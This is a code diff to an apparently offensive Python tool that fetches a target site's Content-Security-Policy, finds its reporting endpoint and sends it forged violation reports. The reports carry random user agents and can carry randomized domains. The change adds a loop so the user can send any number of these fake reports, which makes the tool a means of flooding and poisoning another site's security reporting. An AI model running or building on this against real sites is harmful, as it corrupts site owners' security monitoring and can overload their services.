@@ -1,9 +1,10 @@
 import requests
 import json
 from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 import random
 import string
+
 
 def print_banner():
     banner = """
@@ -16,6 +17,7 @@ def print_banner():
 #############################
     """
     print(banner)
+
 
 def get_csp_directives(url):
     """ Fetch headers from URL and extract all CSP directives. """
@@ -36,6 +38,7 @@ def get_csp_directives(url):
         print(f"Failed to retrieve headers from {url}: {e}")
         return {}
 
+
 def random_user_agent():
     """ Return a random User-Agent string. """
     user_agents = [
@@ -46,6 +49,7 @@ def random_user_agent():
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
     ]
     return random.choice(user_agents)
+
 
 def send_report(url, endpoint, directive, value, randomize_domain):
     """ Send a CSP report using an actual directive from the site's policy with a randomized domain. """
@@ -75,36 +79,44 @@ def send_report(url, endpoint, directive, value, randomize_domain):
     except requests.RequestException as e:
         return 0, f"Failed to send CSP report: {e}"
 
-def process_requests(url, randomize_domain):
+
+def process_requests(url, randomize_domain, count):
     directives = get_csp_directives(url)
     if not directives:
         print("No CSP directives found.")
         return
 
-    # Select a random directive to report
-    directive, value = random.choice(list(directives.items()))
-
-    # Find endpoint from the directives
+    # Find endpoint from the directives, resolve to full URL if necessary
     endpoint = directives.get('report-uri', None) or directives.get('report-to', None)
+    if endpoint:
+        if not endpoint.startswith(('http://', 'https://')):
+            endpoint = urljoin(url, endpoint)
+
     if not endpoint:
         print("No reporting endpoint found in CSP directives.")
         return
 
-    # Send a report for the selected directive
-    status_code, response = send_report(url, endpoint, directive, value, randomize_domain)
-    print(f"Report sent for directive '{directive}': Status Code: {status_code}, Response: {response}")
+    for _ in range(count):
+        # Select a random directive to report
+        directive, value = random.choice(list(directives.items()))
+        # Send a report for the selected directive
+        status_code, response = send_report(url, endpoint, directive, value, randomize_domain)
+        print(f"Report sent for directive '{directive}': Status Code: {status_code}, Response: {response}")
+
 
 def main():
     print_banner()
     domain = input("Enter the Target Domain (include 'http://' or 'https://'): ").strip()
     randomize_domain = input("Randomize the reported domain name in the CSP report? (Y/N): ").strip().lower() == 'y'
-    
+    report_count = int(input("How many times would you like to send the report? "))
+
     # Normalize and process URL
     if not domain.startswith(('http://', 'https://')):
         domain = 'http://' + domain
     domain = urlparse(domain).geturl()
 
-    process_requests(domain, randomize_domain)
+    process_requests(domain, randomize_domain, report_count)
+
 
 if __name__ == "__main__":
     main()
